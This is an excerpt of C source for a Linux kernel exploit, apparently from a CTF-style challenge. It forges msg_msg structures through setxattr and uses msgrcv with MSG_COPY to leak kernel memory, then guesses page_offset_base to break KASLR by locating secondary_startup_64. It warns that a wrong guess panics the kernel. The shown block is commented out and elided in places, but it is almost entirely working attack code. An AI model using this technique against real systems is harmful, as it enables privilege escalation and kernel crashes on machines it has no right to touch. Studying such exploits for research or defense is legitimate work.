...
int main(void)
{
    ...
    // guess the page_offset_base to try to leak kernel text base
    /*kernel_text_leak = NULL;
    if (kernel_text_leak)
        goto leak_out;
    page_offset_base_guess = kernel_heap_leak & 0xfffffffff0000000;
    printf("[*] try to hit the page_offse_base at %p\n", page_offset_base_guess);
    puts("\033[31m\033[1m[!]if we failed, THE KERNEL WILL PANIC!\033[0m");
    while (1)
    {
        char ch;
        printf("[*] Still wanna try it? YOUR CHOICE: [Y/n]");
        ch = getchar();
        switch (ch)
        {
            case 'Y':
            case 'y':
            case '\n':
                puts("[!] Now try the dangerous way.");
                goto try_dangerous;
                break;
            case 'N':
            case 'n':
                puts("[*] Now try the safe way.");
                goto try_safe;
                break;
            default:
...
try_dangerous:
    ...
    ((struct msg_msg*) buf)->m_list.prev = NULL;
    ((struct msg_msg*) buf)->m_type = NULL;
    ((struct msg_msg*) buf)->m_ts = 0x1500;
    ((struct msg_msg*) buf)->next = page_offset_base_guess + 0x9d000 - 0x10;
    ((struct msg_msg*) buf)->security = NULL;

    setxattr("/tmp/exp", "arttnba3", buf, 0x2e0, 0);

    ret = msgrcv(ms_qid[0], buf, 0x1500, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
    if (ret < 0)
    {
        puts("[x] msgrcv!");
        goto try_safe;
    }
    for (int i = 0; i < 0x1500 / 8; i++)
        printf("[data leak][%d] %p\n", i, buf[i]);
    sleep(5);
    kernel_text_leak = buf[508];
    printf("[*] leak the data that may be secondary_startup_64: %p\n", kernel_text_leak);
    if (((kernel_text_leak - SECONDARY_STARTUP_64) & 0xfff) != 0)
    {
        puts("[!] It seems that we didn\'t hit the right place? But we survive! Now try the safe way...");
        kernel_text_leak = NULL;
    }
    else
    {
        printf("[+] Successfully hit the page_offset_base: %p\n", page_offset_base_guess);
        kernel_offset = kernel_text_leak - SECONDARY_STARTUP_64;
        kernel_base += kernel_offset;
        goto leak_out;
    }*/
